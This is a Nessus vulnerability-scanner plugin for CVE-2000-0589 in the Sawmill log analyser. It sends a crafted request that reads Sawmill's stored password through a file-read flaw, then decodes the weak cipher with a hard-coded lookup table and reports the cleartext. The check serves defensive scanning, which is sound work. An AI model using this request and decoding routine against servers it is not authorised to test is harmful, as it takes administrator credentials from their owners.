#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10454);
 script_version ("$Revision: 1.24 $");
 script_cve_id("CVE-2000-0589");
 script_bugtraq_id(1403);
 script_xref(name:"OSVDB", value:"353");

 script_name(english: "Sawmill Weak Password Encryption Scheme Information Disclosure");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote server is vulnerable to information disclosure." );
 script_set_attribute(attribute:"description", value:
"This script reads the remote SawMill password and deciphers it.
This password may be used to reconfigure SawMill." );
 script_set_attribute(attribute:"solution", value: "Upgrade SawMill");
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
 script_end_attributes();

 script_summary(english: "Obtains SawMill password");
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english: "CGI abuses");
 script_dependencie("find_service1.nasl", "sawmill.nasl", "http_version.nasl");
 script_require_keys("Sawmill/readline");
 script_require_ports("Services/www", 80, 8987);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

method = get_kb_item("Sawmill/method");

if(method == "cgi")
{
 cgi = 1;
 port = get_http_port(default:80);

}
else
{
cgi = 0;
port = 8987;
}

if(!get_port_state(port))exit(0);


foreach dir (cgi_dirs())
{
 if(cgi)
  req = string(dir, "/sawmill?rfcf+%22SawmillInfo/SawmillPassword%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3");
 else
  req  = string("/sawmill?rfcf+%22SawmillInfo/SawmillPassword%22+spbn+1,1,21,1,1,1,1,1,1,1,1,1+3");

 req = http_get(item:req, port:port);
   
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL ) exit(0);
 
 r = strstr(r, "Unknown configuration");
 if(r)
 {
  end = strstr(r, "<br>");
  r = r - end;
  pattern = ".*Unknown configuration command " + raw_string(0x22) +
  	    "(.*)" + raw_string(0x22) + " in .*$";
     
  pass = ereg_replace(string:r,  pattern:pattern, replace:"\1");
 
  
  #
  # Code from Larry W. Cashdollar
  #
  clear = "";
  len = strlen(pass);
  alpha  = 
  	  "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+~<>?:"+raw_string(0x22, 0x7B, 0x7D) +"|";

  encode =
  	  "=GeKMNQS~TfUVWXY"+raw_string(0x5B)+"abcygimrs"+raw_string(0x22)+"#$&-"+raw_string(0x5D)+"FLq4.@wICH2!oEn"+raw_string(0x7D)+
  	   "Z%(Ovt"+raw_string(0x7B)+"z";
 
  for (x = 0; x < len; x = x+1)
    {

      for (y = 0; y < strlen (encode); y=y+1)
        if (pass[x] == encode[y])
          clear = clear + alpha[y];

    }
  
  report = string("The sawmill password seems to be '") + clear +
  	   string("'\nWe could guess it thanks to the fact that sawmill allows\n",
	          "the reading of arbitrary files and to the weak encryption algorithm\n",
		  "used by this software. An attacker can use this password to reconfigure\n",
		  "your sawmill daemon.\n");
 security_hole(port:port, extra: report);
  
 }
}
